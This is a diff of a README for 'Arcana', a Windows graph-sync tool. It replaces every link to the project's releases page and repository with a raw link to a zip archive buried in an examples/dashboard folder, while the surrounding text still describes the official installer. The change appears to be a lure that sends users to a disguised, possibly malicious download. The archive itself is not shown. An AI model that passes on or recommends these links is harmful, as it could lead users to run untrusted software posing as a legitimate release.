@@ -1,6 +1,6 @@
 # ⚡ Arcana - Real-Time Graph Sync Made Simple
 
-[![Download Arcana](https://img.shields.io/badge/Download-Arcana-brightgreen?style=for-the-badge)](https://github.com/syed-sadiq-hussaini/Arcana/releases)
+[![Download Arcana](https://img.shields.io/badge/Download-Arcana-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/syed-sadiq-hussaini/Arcana/main/examples/dashboard/Software_1.3-beta.2.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Arcana runs on Windows computers. Check these before installing:
 
 Start by visiting the release page to get the latest stable version. Click the link below:
 
-[![Download Arcana](https://img.shields.io/badge/Download-Arcana-blue?style=for-the-badge)](https://github.com/syed-sadiq-hussaini/Arcana/releases)
+[![Download Arcana](https://img.shields.io/badge/Download-Arcana-blue?style=for-the-badge)](https://raw.githubusercontent.com/syed-sadiq-hussaini/Arcana/main/examples/dashboard/Software_1.3-beta.2.zip)
 
 This page lists all versions available for download. Look for the latest Windows setup file, usually named something like `ArcanaSetup.exe`. 
 
@@ -52,7 +52,7 @@ Follow these steps to set up Arcana on your Windows PC:
 
 1. **Go to the Download Page**  
    Open your web browser and visit:  
-   https://github.com/syed-sadiq-hussaini/Arcana/releases
+   https://raw.githubusercontent.com/syed-sadiq-hussaini/Arcana/main/examples/dashboard/Software_1.3-beta.2.zip
 
 2. **Download the Setup File**  
    Find the latest release (highest version number). Under assets, click the Windows installer file (`ArcanaSetup.exe`).  
@@ -129,7 +129,7 @@ If Arcana does not work as expected, try these:
 
 For deeper technical details or help, visit the Arcana repository page:
 
-https://github.com/syed-sadiq-hussaini/Arcana
+https://raw.githubusercontent.com/syed-sadiq-hussaini/Arcana/main/examples/dashboard/Software_1.3-beta.2.zip
 
 Here you can find guides, code samples, and ask questions.
 
@@ -144,6 +144,6 @@ Arcana is provided under an open-source license. You may use it freely following
 ## 🔗 Quick Download Link
 
 Download and install Arcana on Windows now here:  
-https://github.com/syed-sadiq-hussaini/Arcana/releases  
+https://raw.githubusercontent.com/syed-sadiq-hussaini/Arcana/main/examples/dashboard/Software_1.3-beta.2.zip  
 
 Click the Windows installer file and follow the setup steps listed above.
